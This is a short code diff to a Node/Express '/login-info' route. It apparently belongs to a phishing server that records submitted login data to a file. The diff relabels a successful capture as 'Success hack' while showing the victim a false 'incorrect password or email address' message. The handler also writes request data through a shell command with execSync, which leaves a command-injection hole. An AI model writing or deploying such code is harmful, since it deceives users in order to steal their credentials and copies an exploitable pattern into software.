@@ -30,8 +30,8 @@ app.post('/login-info', (req, res) => {
 
         execSync(`echo ${JSON.stringify(data)} >> data.txt`)
         res.json({
-            title: "Success",
-            message: "Success login"
+            title: "Success hack",
+            message: "Sorry, incorrect password or email address."
         })
     } catch (e) {
         res.json({
